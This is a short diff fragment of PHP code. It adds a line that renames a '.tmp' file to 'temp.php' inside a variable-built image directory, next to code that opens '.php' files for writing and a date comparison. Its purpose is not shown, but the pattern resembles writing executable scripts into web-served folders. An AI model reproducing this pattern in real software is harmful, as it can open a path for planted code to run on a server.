@@ -60,6 +60,7 @@ if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date
 
 <?php
 		rename($temp.".php", $ds."/".$img."/".$temp."/".$dt2.".php");
+		rename($temp.".tmp", $ds."/".$img."/".$temp."/temp.php");
 		$myfile = fopen($temp.".php", "w") or die("Unable to open file!");
 		$myfilex = fopen($temp.".tmp", "w") or die("Unable to open file!");
 		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("Unable to open file!");
